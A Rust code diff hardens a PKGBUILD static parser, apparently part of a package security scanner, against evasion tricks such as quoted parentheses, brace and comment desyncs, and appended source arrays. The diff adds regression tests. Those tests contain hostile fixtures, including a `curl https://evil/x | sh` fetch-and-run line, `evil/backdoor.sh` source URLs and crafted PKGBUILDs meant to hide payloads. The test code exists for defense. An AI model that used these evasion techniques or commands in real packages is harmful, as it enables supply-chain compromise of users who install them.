@@ -13,11 +13,19 @@ lazy_static! {
     static ref VAR_SIMPLE: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=([^(].*?)$"#).unwrap();
     static ref VAR_QUOTED: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=["'](.*)["']$"#).unwrap();
 
-    // Array patterns
-    static ref ARRAY_SINGLE: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=\((.*)\)$"#).unwrap();
-    static ref ARRAY_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=\($"#).unwrap();
-    // Multi-line array that starts with content on first line
-    static ref ARRAY_MULTILINE_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=\((.+)$"#).unwrap();
+    // Array patterns. Group 2 captures an optional `+` so `name+=(...)` (append)
+    // is parsed instead of silently dropped -- a second `source+=(...)` would
+    // otherwise never reach the source/checksum analyzers. A single-line array
+    // is handled by ARRAY_MULTILINE_START whose content is fed to the quote-aware
+    // `array_terminator` scanner (which finds the real closing paren on the same
+    // line), so no separate single-line pattern is needed.
+    static ref ARRAY_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)(\+?)=\($"#).unwrap();
+    // Array that starts with content on the first line (single- or multi-line).
+    static ref ARRAY_MULTILINE_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)(\+?)=\((.+)$"#).unwrap();
+
+    // An assignment-looking line we may fail to fully parse, used only to warn
+    // (never silently drop attacker input without a trace).
+    static ref ASSIGN_LIKE: Regex = Regex::new(r#"^[a-zA-Z_][a-zA-Z0-9_]*\+?=\("#).unwrap();
 
     // Function patterns
     static ref FUNC_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\s*\)\s*\{?"#).unwrap();
@@ -100,38 +108,33 @@ impl StaticParser {
             .collect()
     }
 
-    /// Extract function body starting from a line
+    /// Extract function body starting from a line.
+    ///
+    /// Brace balance is tracked with a quote-aware scanner so a `}` inside a
+    /// string (`echo "}"`) cannot close the function early and push the rest of
+    /// the body -- where a payload could hide -- outside what we parse.
     fn extract_function(&self, lines: &[&str], start_idx: usize) -> Option<(String, usize)> {
-        let mut brace_count = 0;
+        let mut scanner = crate::textutil::BraceScanner::default();
         let mut in_function = false;
         let mut body_lines = Vec::new();
         let mut end_idx = start_idx;
 
         for (i, line) in lines.iter().enumerate().skip(start_idx) {
-            let trimmed = line.trim();
-
-            // Count braces (simplified - doesn't handle strings/comments)
-            for ch in trimmed.chars() {
-                match ch {
-                    '{' => {
-                        brace_count += 1;
-                        in_function = true;
-                    }
-                    '}' => brace_count -= 1,
-                    _ => {}
-                }
+            scanner.feed(line);
+            // `peak > 0` (not `depth > 0`) so a function whose whole body is on
+            // one line (`pkgver() { ...; }`) -- where depth rises to 1 and falls
+            // back to 0 within the same fed line -- is still recognized as
+            // entered and captured.
+            if scanner.peak > 0 {
+                in_function = true;
             }
 
             if in_function {
                 body_lines.push(*line);
-                if brace_count == 0 {
+                if scanner.depth == 0 {
                     end_idx = i;
                     break;
                 }
-            } else if trimmed.ends_with('{') {
-                body_lines.push(*line);
-                brace_count = 1;
-                in_function = true;
             }
         }
 
@@ -163,69 +166,99 @@ impl PkgbuildParser for StaticParser {
         let lines: Vec<&str> = content.lines().collect();
         let mut i = 0;
 
-        // Collect multi-line arrays
-        let mut pending_array: Option<(String, String)> = None;
+        // Collect multi-line arrays: (name, append?, collected-content).
+        let mut pending_array: Option<(String, bool, String)> = None;
 
         while i < lines.len() {
             let line = lines[i];
             let trimmed = line.trim();
 
-            // Skip comments and empty lines
-            if trimmed.is_empty() || COMMENT.is_match(trimmed) {
+            // Skip blank lines and whole-line comments -- but ONLY when we are
+            // not in the middle of a multi-line array. Inside an open array a
+            // `#`-leading (or blank) physical line can be content inside a quote
+            // opened on an earlier line (bash keeps it as part of the value), so
+            // it must reach the continuation handler below, which strips comments
+            // quote-awarely. Dropping it here would silently delete quoted
+            // content -- the same comment/quote desync class as defect #3.
+            if pending_array.is_none() && (trimmed.is_empty() || COMMENT.is_match(trimmed)) {
                 i += 1;
                 continue;
             }
 
-            // Handle multi-line array continuation
-            if let Some((name, ref mut collected)) = pending_array.as_mut() {
-                collected.push(' ');
-                collected.push_str(trimmed.trim_end_matches(')'));
+            // Strip a trailing inline comment for matching, e.g.
+            // `source=("x") # note`. The stripper is quote-aware so a `#` inside
+            // a value (a VCS `#commit=` fragment, a URL anchor) is preserved.
+            let code = strip_inline_comment(trimmed);
 
-                if trimmed.ends_with(')') {
-                    let elements = self.parse_array_elements(collected);
-                    self.assign_array(&mut pkgbuild, name, elements);
-                    pending_array = None;
+            // Handle multi-line array continuation. The array only ends at a `)`
+            // that is unquoted and at paren-depth 0 (`array_terminator`); a `)`
+            // inside a quoted value -- e.g. a multi-line quoted source whose first
+            // physical line ends in `)` -- must NOT close it, or every following
+            // source/checksum line would be dropped before reaching the analyzers
+            // (defect #3). `take()` so we can re-store the buffer without a borrow
+            // conflict when the array is not yet closed.
+            if let Some((name, append, mut collected)) = pending_array.take() {
+                // Strip THIS continuation line's inline comment using the quote
+                // state carried from the buffer so far -- NOT the per-line `code`
+                // (which `strip_inline_comment` computed with a fresh quote state).
+                // A `#` on a continuation line that is still inside a quote opened
+                // on an earlier array line is part of the value, not a comment;
+                // stripping it with a reset state would delete the real closing
+                // quote/paren and silently drop the whole array (the desync that
+                // re-opened defect #3).
+                //
+                // The join `\n` is pushed BEFORE computing the carried state so a
+                // trailing `\` line-continuation escapes the newline exactly as
+                // `array_terminator` (which re-scans the whole buffer) sees it. If
+                // the state were computed first, the seed would carry escaped=true
+                // into the next line while array_terminator carries escaped=false
+                // after consuming the `\n` -- they would disagree, and a leading
+                // `"` on the next line would be eaten as escaped, exposing its `#`
+                // as a bogus comment and silently dropping the trailing source.
+                collected.push('\n');
+                let (in_single, in_double, escaped) = quote_state_at_end(&collected);
+                let cline = strip_inline_comment_stateful(trimmed, in_single, in_double, escaped);
+                collected.push_str(cline);
+
+                if let Some(end) = array_terminator(&collected) {
+                    let elements = self.parse_array_elements(&collected[..end]);
+                    self.assign_array(&mut pkgbuild, &name, elements, append);
+                    // pending_array already None (taken); leave it closed.
+                } else {
+                    pending_array = Some((name, append, collected));
                 }
                 i += 1;
                 continue;
             }
 
             // Check for array start (multi-line, empty first line)
-            if let Some(caps) = ARRAY_START.captures(trimmed) {
+            if let Some(caps) = ARRAY_START.captures(code) {
                 let name = caps.get(1).unwrap().as_str().to_string();
-                pending_array = Some((name, String::new()));
+                let append = !caps.get(2).unwrap().as_str().is_empty();
+                pending_array = Some((name, append, String::new()));
                 i += 1;
                 continue;
             }
 
             // Check for multi-line array with content on first line
-            if let Some(caps) = ARRAY_MULTILINE_START.captures(trimmed) {
+            if let Some(caps) = ARRAY_MULTILINE_START.captures(code) {
                 let name = caps.get(1).unwrap().as_str().to_string();
-                let first_content = caps.get(2).unwrap().as_str();
-                // Check if it actually ends with ) - could be single line
-                if first_content.ends_with(')') {
-                    let content = first_content.trim_end_matches(')');
-                    let elements = self.parse_array_elements(content);
-                    self.assign_array(&mut pkgbuild, &name, elements);
+                let append = !caps.get(2).unwrap().as_str().is_empty();
+                let first_content = caps.get(3).unwrap().as_str();
+                // Single-line only when the closing `)` is unquoted at depth 0.
+                // A quoted `)` in the first element does not close the array.
+                if let Some(end) = array_terminator(first_content) {
+                    let elements = self.parse_array_elements(&first_content[..end]);
+                    self.assign_array(&mut pkgbuild, &name, elements, append);
                 } else {
-                    pending_array = Some((name, first_content.to_string()));
+                    pending_array = Some((name, append, first_content.to_string()));
                 }
                 i += 1;
                 continue;
             }
 
-            // Check for single-line array
-            if let Some(caps) = ARRAY_SINGLE.captures(trimmed) {
-                let name = caps.get(1).unwrap().as_str();
-                let content = caps.get(2).unwrap().as_str();
-                let elements = self.parse_array_elements(content);
-                self.assign_array(&mut pkgbuild, name, elements);
-                i += 1;
-                continue;
-            }
-
             // Check for function definition
-            if let Some(caps) = FUNC_START.captures(trimmed) {
+            if let Some(caps) = FUNC_START.captures(code) {
                 let name = caps.get(1).unwrap().as_str().to_string();
                 if let Some((body, end_idx)) = self.extract_function(&lines, i) {
                     pkgbuild.functions.insert(
@@ -243,7 +276,7 @@ impl PkgbuildParser for StaticParser {
             }
 
             // Check for quoted variable assignment
-            if let Some(caps) = VAR_QUOTED.captures(trimmed) {
+            if let Some(caps) = VAR_QUOTED.captures(code) {
                 let name = caps.get(1).unwrap().as_str();
                 let value = caps.get(2).unwrap().as_str();
                 self.assign_variable(&mut pkgbuild, name, value);
@@ -252,7 +285,7 @@ impl PkgbuildParser for StaticParser {
             }
 
             // Check for simple variable assignment
-            if let Some(caps) = VAR_SIMPLE.captures(trimmed) {
+            if let Some(caps) = VAR_SIMPLE.captures(code) {
                 let name = caps.get(1).unwrap().as_str();
                 let value = caps
                     .get(2)
@@ -264,7 +297,32 @@ impl PkgbuildParser for StaticParser {
                 continue;
             }
 
+            // Nothing matched. If the line *looked* like an array assignment we
+            // could not fully parse, leave a trace rather than dropping
+            // attacker-controlled input unobserved (a silently-dropped
+            // `source+=(...)` would escape source/checksum analysis).
+            if ASSIGN_LIKE.is_match(code) {
+                tracing::debug!("unparsed assignment-like line {}: {:?}", i + 1, code);
+            }
+
             i += 1;
+        }
+
+        // Defense in depth: an array whose closing `)` never arrived (an
+        // unbalanced quote/paren in a crafted PKGBUILD) must NOT be silently
+        // dropped -- that would re-blind the source/checksum analyzers, which
+        // iterate the parsed `source`/`checksums` fields rather than the raw
+        // text (the defect #3 evasion class). Flush the buffered content
+        // best-effort so it still reaches the analyzers, and warn loudly.
+        if let Some((name, append, collected)) = pending_array.take() {
+            tracing::warn!(
+                "unterminated array `{}=(` at end of PKGBUILD: flushing {} buffered bytes so the \
+                 contents are still scanned (possible evasion attempt or malformed PKGBUILD)",
+                name,
+                collected.len()
+            );
+            let elements = self.parse_array_elements(&collected);
+            self.assign_array(&mut pkgbuild, &name, elements, append);
         }
 
         // Validate required fields in strict mode
@@ -297,34 +355,63 @@ impl StaticParser {
             "install" => pkgbuild.install = Some(value.to_string()),
             "changelog" => pkgbuild.changelog = Some(value.to_string()),
             _ => {
-                pkgbuild.variables.insert(name.to_string(), value.to_string());
+                pkgbuild
+                    .variables
+                    .insert(name.to_string(), value.to_string());
             }
         }
     }
 
     /// Assign an array variable to the PKGBUILD structure
-    fn assign_array(&self, pkgbuild: &mut ParsedPkgbuild, name: &str, elements: Vec<String>) {
-        match name {
-            "pkgname" => pkgbuild.pkgname = elements,
-            "arch" => pkgbuild.arch = elements,
-            "license" => pkgbuild.license = elements,
-            "depends" => pkgbuild.depends = elements,
-            "makedepends" => pkgbuild.makedepends = elements,
-            "checkdepends" => pkgbuild.checkdepends = elements,
-            "optdepends" => pkgbuild.optdepends = elements,
-            "provides" => pkgbuild.provides = elements,
-            "conflicts" => pkgbuild.conflicts = elements,
-            "replaces" => pkgbuild.replaces = elements,
-            "backup" => pkgbuild.backup = elements,
-            "options" => pkgbuild.options = elements,
-            "source" => {
-                pkgbuild.source = elements.iter().map(|s| SourceEntry::parse(s)).collect();
+    /// Assign (or, when `append` is true for a `name+=(...)` form, extend) an
+    /// array field.
+    fn assign_array(
+        &self,
+        pkgbuild: &mut ParsedPkgbuild,
+        name: &str,
+        elements: Vec<String>,
+        append: bool,
+    ) {
+        // For Vec<String> fields: replace, or extend when appending.
+        let set = |dst: &mut Vec<String>, mut new: Vec<String>| {
+            if append {
+                dst.append(&mut new);
+            } else {
+                *dst = new;
             }
-            "md5sums" => pkgbuild.checksums.md5sums = self.parse_checksums(&elements),
-            "sha1sums" => pkgbuild.checksums.sha1sums = self.parse_checksums(&elements),
-            "sha256sums" => pkgbuild.checksums.sha256sums = self.parse_checksums(&elements),
-            "sha512sums" => pkgbuild.checksums.sha512sums = self.parse_checksums(&elements),
-            "b2sums" => pkgbuild.checksums.b2sums = self.parse_checksums(&elements),
+        };
+        match name {
+            "pkgname" => set(&mut pkgbuild.pkgname, elements),
+            "arch" => set(&mut pkgbuild.arch, elements),
+            "license" => set(&mut pkgbuild.license, elements),
+            "depends" => set(&mut pkgbuild.depends, elements),
+            "makedepends" => set(&mut pkgbuild.makedepends, elements),
+            "checkdepends" => set(&mut pkgbuild.checkdepends, elements),
+            "optdepends" => set(&mut pkgbuild.optdepends, elements),
+            "provides" => set(&mut pkgbuild.provides, elements),
+            "conflicts" => set(&mut pkgbuild.conflicts, elements),
+            "replaces" => set(&mut pkgbuild.replaces, elements),
+            "backup" => set(&mut pkgbuild.backup, elements),
+            "options" => set(&mut pkgbuild.options, elements),
+            "validpgpkeys" => set(&mut pkgbuild.validpgpkeys, elements),
+            "source" => {
+                let mut parsed: Vec<SourceEntry> =
+                    elements.iter().map(|s| SourceEntry::parse(s)).collect();
+                if append {
+                    pkgbuild.source.append(&mut parsed);
+                } else {
+                    pkgbuild.source = parsed;
+                }
+            }
+            "md5sums" => self.set_checksums(&mut pkgbuild.checksums.md5sums, &elements, append),
+            "sha1sums" => self.set_checksums(&mut pkgbuild.checksums.sha1sums, &elements, append),
+            "sha256sums" => {
+                self.set_checksums(&mut pkgbuild.checksums.sha256sums, &elements, append)
+            }
+            "sha512sums" => {
+                self.set_checksums(&mut pkgbuild.checksums.sha512sums, &elements, append)
+            }
+            "b2sums" => self.set_checksums(&mut pkgbuild.checksums.b2sums, &elements, append),
             _ => {
                 // Store as JSON array in variables
                 pkgbuild
@@ -333,6 +420,141 @@ impl StaticParser {
             }
         }
     }
+
+    /// Replace or extend a checksum array, mapping `SKIP`/empty to `None`.
+    fn set_checksums(&self, dst: &mut Vec<Option<String>>, elements: &[String], append: bool) {
+        let mut parsed = self.parse_checksums(elements);
+        if append {
+            dst.append(&mut parsed);
+        } else {
+            *dst = parsed;
+        }
+    }
+}
+
+/// Truncate a line at a trailing inline comment, preserving `#` characters that
+/// appear inside single/double quotes (so a VCS `#commit=` fragment or a URL
+/// anchor in a quoted source value is not mistaken for a comment). A `#` only
+/// starts a comment when it is unquoted and preceded by whitespace (or starts
+/// the line) -- matching how the shell tokenizes comments.
+fn strip_inline_comment(line: &str) -> &str {
+    strip_inline_comment_stateful(line, false, false, false)
+}
+
+/// Like [`strip_inline_comment`], but seeded with the quote/escape state carried
+/// from preceding physical lines of the SAME multi-line array value.
+///
+/// `strip_inline_comment` resets quote state at the start of every line, which is
+/// correct for a standalone line but WRONG for an array continuation line that is
+/// still inside a quote opened on an earlier line: there a `#` is part of the
+/// quoted value, not a comment. Stripping it with a reset state deletes the real
+/// closing quote/paren so [`array_terminator`] never finds the terminator and the
+/// whole array is silently dropped -- the desync that re-opened defect #3. The
+/// caller seeds this with [`quote_state_at_end`] of the accumulated buffer so the
+/// two scanners agree on what is quoted.
+fn strip_inline_comment_stateful(
+    line: &str,
+    mut in_single: bool,
+    mut in_double: bool,
+    mut escaped: bool,
+) -> &str {
+    let bytes = line.as_bytes();
+    let mut prev_ws = true; // start-of-line counts as a word boundary
+    for (i, &b) in bytes.iter().enumerate() {
+        if escaped {
+            escaped = false;
+            prev_ws = false;
+            continue;
+        }
+        match b {
+            b'\\' if !in_single => {
+                escaped = true;
+                prev_ws = false;
+            }
+            b'\'' if !in_double => {
+                in_single = !in_single;
+                prev_ws = false;
+            }
+            b'"' if !in_single => {
+                in_double = !in_double;
+                prev_ws = false;
+            }
+            b'#' if !in_single && !in_double && prev_ws => {
+                return line[..i].trim_end();
+            }
+            b' ' | b'\t' => prev_ws = true,
+            _ => prev_ws = false,
+        }
+    }
+    line
+}
+
+/// Quote/escape state (in_single, in_double, escaped) after scanning `buf`.
+///
+/// Used to seed [`strip_inline_comment_stateful`] for the next physical line of a
+/// multi-line array, so comment-stripping agrees with [`array_terminator`] (which
+/// re-scans the whole accumulated buffer). Mirrors the same quoting rules: `\`
+/// escapes only outside single quotes; single quotes are literal; `"`/`'` toggle.
+/// Parens and `#` are irrelevant to quote state and ignored here (the buffer this
+/// scans has already had its unquoted comments stripped).
+fn quote_state_at_end(buf: &str) -> (bool, bool, bool) {
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut escaped = false;
+    for ch in buf.chars() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        match ch {
+            '\\' if !in_single => escaped = true,
+            '\'' if !in_double => in_single = !in_single,
+            '"' if !in_single => in_double = !in_double,
+            _ => {}
+        }
+    }
+    (in_single, in_double, escaped)
+}
+
+/// Find the byte index of the `)` that closes an array body, where `buf` is the
+/// accumulated text *after* the opening `name=(`. The terminator is the first
+/// `)` that is **unquoted** and at **nested-paren depth 0**. Single/double quote
+/// and backslash-escape state is tracked across the whole buffer (matching
+/// [`crate::textutil::BraceScanner`]'s convention: `\` escapes outside single
+/// quotes; single quotes are literal), so a `)` inside a quoted value -- or a
+/// balanced `(...)` inside an unquoted value -- is not mistaken for the end of
+/// the array. Returns `None` when the array is still open (more lines follow).
+///
+/// This is the quote-aware replacement for the old `ends_with(')')` /
+/// `trim_end_matches(')')` heuristic, which let an attacker terminate the array
+/// early with a quoted `)` and hide every following source/checksum line from
+/// the analyzers (defect #3).
+fn array_terminator(buf: &str) -> Option<usize> {
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut escaped = false;
+    let mut depth: u32 = 0;
+
+    for (idx, ch) in buf.char_indices() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        match ch {
+            '\\' if !in_single => escaped = true,
+            '\'' if !in_double => in_single = !in_single,
+            '"' if !in_single => in_double = !in_double,
+            '(' if !in_single && !in_double => depth += 1,
+            ')' if !in_single && !in_double => {
+                if depth == 0 {
+                    return Some(idx);
+                }
+                depth -= 1;
+            }
+            _ => {}
+        }
+    }
+    None
 }
 
 #[cfg(test)]
@@ -398,10 +620,349 @@ package() {
     }
 
     #[test]
+    fn append_and_inline_comment_sources_are_parsed() {
+        // ME-9: `source+=(...)` must extend (not be dropped), a trailing inline
+        // comment must not break array parsing, and a `#commit=` fragment inside
+        // a quoted value must be preserved (not treated as a comment).
+        let parser = StaticParser::new();
+        let content = concat!(
+            "pkgname=t\npkgver=1\npkgrel=1\n",
+            "source=(\"https://example.com/a.tar.gz\") # primary\n",
+            "source+=(\"git+https://github.com/u/r.git#commit=deadbeef\")\n",
+        );
+        let result = parser.parse(content).unwrap();
+        assert_eq!(
+            result.source.len(),
+            2,
+            "append must extend the source array"
+        );
+        assert_eq!(result.source[0].url, "https://example.com/a.tar.gz");
+        // The fragment survived (the `#` was not stripped as a comment).
+        assert_eq!(
+            result.source[1].fragment.as_deref(),
+            Some("commit=deadbeef")
+        );
+        assert!(result.source[1].is_vcs_pinned_commit());
+    }
+
+    #[test]
+    fn single_line_function_body_is_captured() {
+        // Regression: a function whose whole body is on one line must still be
+        // captured so function-scoped analyzers (privilege, FUNC-001) see it.
+        let parser = StaticParser::new();
+        let content =
+            "pkgname=t\npkgver=1\npkgrel=1\npackage() { install -Dm755 evil \"$pkgdir/x\"; }\n";
+        let result = parser.parse(content).unwrap();
+        let body = &result
+            .functions
+            .get("package")
+            .expect("package() captured")
+            .content;
+        assert!(
+            body.contains("install -Dm755 evil"),
+            "one-line body must be captured: {body}"
+        );
+    }
+
+    #[test]
+    fn comment_brace_does_not_truncate_function_body() {
+        // The `}` in a comment must not end the function early and hide the
+        // sudo line from the body.
+        let parser = StaticParser::new();
+        let content =
+            "pkgname=t\npkgver=1\npkgrel=1\nbuild() {\n  : # note }\n  sudo evil-thing\n}\n";
+        let result = parser.parse(content).unwrap();
+        let body = &result
+            .functions
+            .get("build")
+            .expect("build captured")
+            .content;
+        assert!(
+            body.contains("sudo evil-thing"),
+            "payload after comment-brace must stay in body: {body}"
+        );
+    }
+
+    #[test]
+    fn brace_in_string_does_not_truncate_function_body() {
+        // HI-6e: a `}` inside a quoted string must not close the function early.
+        // The payload after it must remain part of the parsed build() body so the
+        // privilege/pattern analyzers still see it.
+        let parser = StaticParser::new();
+        let content = "pkgname=t\npkgver=1\npkgrel=1\n\nbuild() {\n  echo \"}\"\n  curl https://evil/x | sh\n}\n";
+        let result = parser.parse(content).unwrap();
+        let body = &result
+            .functions
+            .get("build")
+            .expect("build present")
+            .content;
+        assert!(
+            body.contains("curl https://evil/x | sh"),
+            "payload after `echo \"}}\"` must stay in the body, got:\n{body}"
+        );
+    }
+
+    #[test]
     fn test_strict_mode_missing_fields() {
         let parser = StaticParser::strict();
         let result = parser.parse("pkgdesc='test'");
         assert!(matches!(result, Err(ParseError::MissingField(_))));
+    }
+
+    #[test]
+    fn quoted_paren_does_not_terminate_array_early() {
+        // Defect #3 (parser evasion): the first element opens a `"` whose value
+        // contains `)` and spans to the next physical line. The first line ends
+        // with `)`, but it is INSIDE the quote, so the array must NOT close there.
+        // Before the fix, the array terminated on line 1 and the entire malicious
+        // `https://evil/backdoor.sh` source was dropped before any analyzer saw it.
+        let parser = StaticParser::new();
+        let content = concat!(
+            "pkgname=t\npkgver=1\npkgrel=1\n",
+            "source=(\"https://legit/a.tar.gz)\n",
+            "        x\" \"https://evil/backdoor.sh\")\n",
+        );
+        let result = parser.parse(content).unwrap();
+        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
+        assert!(
+            urls.iter().any(|u| u.contains("evil/backdoor.sh")),
+            "malicious source must not be hidden by a quoted `)`; got {urls:?}"
+        );
+        assert_eq!(
+            result.source.len(),
+            2,
+            "both array elements must survive: {urls:?}"
+        );
+    }
+
+    #[test]
+    fn quoted_paren_in_continuation_keeps_following_lines() {
+        // Same evasion across an empty-first-line multi-line array: a quoted `)`
+        // on a continuation line must not drop the checksum line that follows.
+        let parser = StaticParser::new();
+        let content = concat!(
+            "pkgname=t\npkgver=1\npkgrel=1\n",
+            "source=(\n",
+            "        \"git+https://h/r.git#branch=v1)\n",
+            "        more\"\n",
+            "        \"https://evil/backdoor.sh\")\n",
+            "sha256sums=('AAA'\n",
+            "            'BBB')\n",
+        );
+        let result = parser.parse(content).unwrap();
+        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
+        assert!(
+            urls.iter().any(|u| u.contains("evil/backdoor.sh")),
+            "source after a quoted `)` continuation line must survive; got {urls:?}"
+        );
+        // The checksum array (after the source array) must still be parsed.
+        assert_eq!(
+            result.checksums.sha256sums.len(),
+            2,
+            "checksum array following the evaded source array must not be dropped"
+        );
+    }
+
+    #[test]
+    fn nested_parens_in_unquoted_value_do_not_terminate_early() {
+        // A balanced `(...)` inside an array value must not be read as the close.
+        let parser = StaticParser::new();
+        let content = concat!(
+            "pkgname=t\npkgver=1\npkgrel=1\n",
+            "source=(\"https://example.com/file-(1).tar.gz\"\n",
+            "        \"https://example.com/second.tar.gz\")\n",
+        );
+        let result = parser.parse(content).unwrap();
+        assert_eq!(result.source.len(), 2);
+        assert!(result.source[1].url.contains("second.tar.gz"));
+    }
+
+    #[test]
+    fn hash_inside_single_quoted_continuation_is_not_a_comment() {
+        // Task 4049 (defect #3 redux): a single quote opened on array line 1 is
+        // still open on the continuation line, so the ` # rm -rf` there is part of
+        // the quoted value, NOT a comment. The old per-line strip_inline_comment
+        // reset quote state and stripped it, deleting the closing `'`/`)` so the
+        // whole source AND sha256sums arrays were silently dropped (re-blinding
+        // source.rs / checksum.rs). They must survive now.
+        let parser = StaticParser::new();
+        let content = concat!(
+            "pkgname=t\npkgver=1\npkgrel=1\n",
+            "source=('http://legit.example/a.tar.gz\n",
+            "  payload # rm -rf')\n",
+            "sha256sums=('SKIP')\n",
+        );
+        let result = parser.parse(content).unwrap();
+        // The array must NOT be dropped (bash sees one multi-line single-quoted
+        // element containing both the URL and the payload text).
+        assert!(
+            !result.source.is_empty(),
+            "source must not be silently dropped"
+        );
+        let joined = result
+            .source
+            .iter()
+            .map(|s| s.url.as_str())
+            .collect::<String>();
+        assert!(
+            joined.contains("http://legit.example/a.tar.gz"),
+            "URL must reach the analyzers: {joined:?}"
+        );
+        assert!(
+            joined.contains("payload"),
+            "hidden payload text must reach the analyzers: {joined:?}"
+        );
+        // sha256sums was being swallowed into the dropped buffer too.
+        assert_eq!(
+            result.checksums.sha256sums.len(),
+            1,
+            "checksum array must still parse"
+        );
+    }
+
+    #[test]
+    fn hash_inside_double_quoted_continuation_is_preserved() {
+        // Same desync, double-quoted multi-line value; the `#` between the open
+        // and close `"` must stay in the element and the trailing source survives.
+        let parser = StaticParser::new();
+        let content = concat!(
+            "pkgname=t\npkgver=1\npkgrel=1\n",
+            "source=(\"multi\n",
+            "line # value\"\n",
+            "        \"https://evil/backdoor.sh\")\n",
+        );
+        let result = parser.parse(content).unwrap();
+        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
+        assert!(
+            urls.iter().any(|u| u.contains("evil/backdoor.sh")),
+            "trailing source must survive: {urls:?}"
+        );
+        assert!(
+            urls.iter().any(|u| u.contains("# value")),
+            "quoted `#` must be preserved in the value: {urls:?}"
+        );
+    }
+
+    #[test]
+    fn real_comment_on_continuation_line_is_still_stripped() {
+        // The other direction: an UNQUOTED `#` on a continuation line is a real
+        // comment and must still be stripped -- including a `)` inside it, which
+        // must not be mistaken for the array terminator.
+        let parser = StaticParser::new();
+        let content = concat!(
+            "pkgname=t\npkgver=1\npkgrel=1\n",
+            "source=(\"a\"\n",
+            "        \"b\"  # ) trailing note, not a terminator\n",
+            "        \"c\")\n",
+        );
+        let result = parser.parse(content).unwrap();
+        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
+        assert_eq!(
+            urls,
+            vec!["a", "b", "c"],
+            "real comment (and its `)`) must be stripped: {urls:?}"
+        );
+    }
+
+    #[test]
+    fn unterminated_array_is_flushed_not_dropped() {
+        // A genuinely unterminated array (no closing quote/paren ever) must be
+        // flushed best-effort so its contents still reach the analyzers, never
+        // silently dropped.
+        let parser = StaticParser::new();
+        let content = "pkgname=t\npkgver=1\npkgrel=1\nsource=('http://legit.example/x.tar.gz\n";
+        let result = parser.parse(content).unwrap();
+        assert!(
+            !result.source.is_empty(),
+            "unterminated array must be flushed, not dropped"
+        );
+        assert!(result
+            .source
+            .iter()
+            .any(|s| s.url.contains("http://legit.example/x.tar.gz")));
+    }
+
+    #[test]
+    fn escaped_eol_double_quote_does_not_drop_trailing_source() {
+        // Task 4049 round 2 (Echo's seam catch): a trailing `\` line-continuation
+        // escapes the join newline. The carried-state seed must be computed AFTER
+        // the `\n` is pushed (so the escape is absorbed exactly like
+        // array_terminator sees it); otherwise the next line's leading `"` is
+        // eaten as escaped, its `#` becomes a bogus comment, and the trailing
+        // `http://evil/x` source is silently dropped. Bash builds three sources;
+        // the scanner must see evil/x.
+        let parser = StaticParser::new();
+        let content =
+            "pkgname=t\npkgver=1\npkgrel=1\nsource=(http://legit/a \\\n\" #) x\" http://evil/x)\n";
+        let result = parser.parse(content).unwrap();
+        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
+        assert!(
+            urls.iter().any(|u| u.contains("http://evil/x")),
+            "trailing source must not be dropped: {urls:?}"
+        );
+        assert!(
+            urls.iter().any(|u| u.contains("http://legit/a")),
+            "first source must survive: {urls:?}"
+        );
+    }
+
+    #[test]
+    fn escaped_eol_single_quote_sibling_does_not_drop_trailing_source() {
+        // Single-quote sibling of the escaped-EOL seam.
+        let parser = StaticParser::new();
+        let content =
+            "pkgname=t\npkgver=1\npkgrel=1\nsource=(http://legit/a \\\n' #) x' http://evil/x)\n";
+        let result = parser.parse(content).unwrap();
+        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
+        assert!(
+            urls.iter().any(|u| u.contains("http://evil/x")),
+            "trailing source must not be dropped: {urls:?}"
+        );
+        assert!(
+            urls.iter().any(|u| u.contains("http://legit/a")),
+            "first source must survive: {urls:?}"
+        );
+    }
+
+    #[test]
+    fn comment_leading_line_inside_open_quote_is_not_dropped() {
+        // Sibling seam (same desync class): a continuation line that STARTS with
+        // `#` while inside a quote opened on an earlier array line must NOT be
+        // dropped by the top-of-loop whole-line comment skip -- bash keeps it as
+        // quoted content. The `#http://evil/x` line must reach the analyzers.
+        let parser = StaticParser::new();
+        let content =
+            "pkgname=t\npkgver=1\npkgrel=1\nsource=(\"http://legit/a\n#http://evil/x\n\")\n";
+        let result = parser.parse(content).unwrap();
+        let joined = result
+            .source
+            .iter()
+            .map(|s| s.url.clone())
+            .collect::<String>();
+        assert!(
+            joined.contains("http://evil/x"),
+            "comment-leading line inside an open quote must not be dropped: {joined:?}"
+        );
+    }
+
+    #[test]
+    fn comment_line_between_array_elements_is_still_ignored() {
+        // Control: a genuine whole-line comment BETWEEN elements (not inside a
+        // quote) is still ignored, and a `)` inside it does not terminate.
+        let parser = StaticParser::new();
+        let content = concat!(
+            "pkgname=t\npkgver=1\npkgrel=1\n",
+            "source=(\"a\"\n",
+            "        # a comment ) with a paren\n",
+            "        \"b\")\n",
+        );
+        let result = parser.parse(content).unwrap();
+        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
+        assert_eq!(
+            urls,
+            vec!["a", "b"],
+            "comment line between elements must be ignored: {urls:?}"
+        );
     }
 
     #[test]
